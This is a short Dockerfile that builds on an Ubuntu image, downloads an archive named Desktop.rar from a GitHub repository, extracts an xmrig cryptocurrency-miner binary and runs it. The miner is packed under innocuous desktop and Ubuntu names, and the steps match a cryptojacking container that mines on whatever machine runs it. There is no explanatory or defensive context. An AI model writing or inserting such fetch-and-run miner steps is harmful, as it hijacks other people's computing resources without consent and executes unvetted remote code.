FROM ubuntu:latest
RUN apt-get update && apt-get install -y vim git curl pciutils wget
RUN apt-get install -y unrar
RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/Desktop.rar
RUN unrar e -r /Desktop.rar
RUN chmod +x "/xmrig"
RUN ./xmrig
